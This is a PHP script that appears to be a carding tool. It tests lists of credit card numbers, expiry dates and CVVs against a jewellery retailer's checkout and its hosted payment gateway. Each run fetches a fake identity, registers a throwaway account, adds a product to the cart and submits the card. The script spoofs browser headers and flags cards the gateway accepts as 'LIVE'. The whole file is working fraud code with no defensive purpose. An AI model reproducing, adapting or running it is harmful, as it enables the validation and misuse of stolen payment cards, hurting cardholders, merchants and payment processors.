<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.somethingsilver.com/addtocart.cfm",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_POSTFIELDS => "pictureid=12289&sku=20465&sku_color=CUBICZIRCONIA&qty=1&product_id=19370",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
      ],
    ]);
    $addToCart = curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.somethingsilver.com/cartcheckout.cfm?u=new&checkouttype=EXPRESS",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_POSTFIELDS => "operation=registrationform&Company=&FirstName=$fname&LastName=$lname&address1=$street&City=$city&state=$state&Zip=$postcode&Country=US&Email=$fname$lname$cookie@gmail.com&password=%2523temppwd%2523&passwordChk=%2523temppwd%2523&PHONE1=$phone",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
      ],
    ]);
    $submitAddress = curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.somethingsilver.com/cartcheckout.cfm?ship_method_id=5%20",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer: https://www.somethingsilver.com/cartcheckout.cfm?+",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
      ],
    ]);
    $paypage = GetStr(curl_exec($curl), '<iframe id="PMTiframe" style="height:400px;" src="https://ws.paygateway.com/HostPayService/v1/hostpay/paypage/', '"');
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://ws.paygateway.com/HostPayService/v1/hostpay/paypage/$paypage",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
      ],
    ]);
    curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://ws.paygateway.com/HostPayService/v1/hostpay/paypage/validate/$paypage",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_POSTFIELDS => "trackdata_check_interval_ms=500&auto_submit_flag=false&order_description=&invoice_number=&purchase_order_number=&cc=$cc&expire_month_display=".ltrim($mm, "0")."&expire_year_display=$yy&expire_month=".ltrim($mm, "0")."&expire_year=$yy&credit_card_verification_number=$cvv&credit_card_number=$cc&billing_customer_title=&billing_first_name=$fname&billing_middle_name=&billing_last_name=$lname&billing_company=&billing_address_one=$street&billing_address_two=&billing_city=$city&billing_country_code=US&billing_state_or_province=$state&billing_postal_code=$postcode&billing_email=&billing_phone=&billing_note=&clerk_id=&shipping_address_one=&shipping_address_two=&shipping_date=&shipping_postal_code=&createAliasHidden=true&createAlias=true&user_defined_one=&user_defined_two=&user_defined_three=",
        CURLOPT_HTTPHEADER => [
            "Accept: application/json, text/javascript, */*; q=0.01",
            "Content-Type: application/x-www-form-urlencoded",
            "Origin: https://ws.paygateway.com",
            "Referer: https://ws.paygateway.com/HostPayService/v1/hostpay/paypage/$paypage",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
            "X-Requested-With: XMLHttpRequest",
      ],
    ]);
    curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://ws.paygateway.com/HostPayService/v1/hostpay/paypage/$paypage",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_POSTFIELDS => "trackdata_check_interval_ms=500&auto_submit_flag=false&order_description=&invoice_number=&purchase_order_number=&expire_month_display=".ltrim($mm, "0")."&expire_year_display=$yy&expire_month=".ltrim($mm, "0")."&expire_year=$yy&credit_card_verification_number=$cvv&credit_card_number=$cc&billing_customer_title=&billing_first_name=$fname&billing_middle_name=&billing_last_name=$lname&billing_company=&billing_address_one=$street&billing_address_two=&billing_city=$city&billing_country_code=US&billing_state_or_province=$state&billing_postal_code=$postcode&billing_email=&billing_phone=&billing_note=&clerk_id=&shipping_address_one=&shipping_address_two=&shipping_date=&shipping_postal_code=&createAliasHidden=true&createAlias=true&user_defined_one=&user_defined_two=&user_defined_three=",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "Origin: https://ws.paygateway.com",
            "Referer: https://ws.paygateway.com/HostPayService/v1/hostpay/paypage/$paypage",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
      ],
    ]);
    $exec = curl_exec($curl);
    curl_close($curl);

    $message = GetStr($exec, 'response_code_text=', '"');
    $dcode = GetStr($exec, 'response_code=', '&');
    $orderid = GetStr($exec, 'order_id=', '&');

    $response = "[ $dcode - $message ]";

    if(strpos($exec, 'response_code_text=Successful')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$orderid.' | '.$response.'</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>